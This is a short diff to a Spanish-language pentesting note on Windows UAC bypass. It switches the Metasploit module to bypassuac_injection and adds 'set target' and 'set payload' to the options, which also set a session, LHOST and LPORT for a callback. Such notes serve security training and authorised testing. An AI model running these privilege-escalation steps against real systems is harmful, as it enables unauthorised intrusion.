@@ -50,12 +50,14 @@ Si aparece, el usuario es **miembro del grupo Administradores**, lo que permite 
 
 ### Módulo base:
 ```bash
-use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac_injection
 ```
 
 ### Opciones necesarias:
 ```bash
 set SESSION <id_de_sesion_shell>
+set target
+set payload
 set LHOST <tu_ip>
 set LPORT <tu_puerto>
 ```
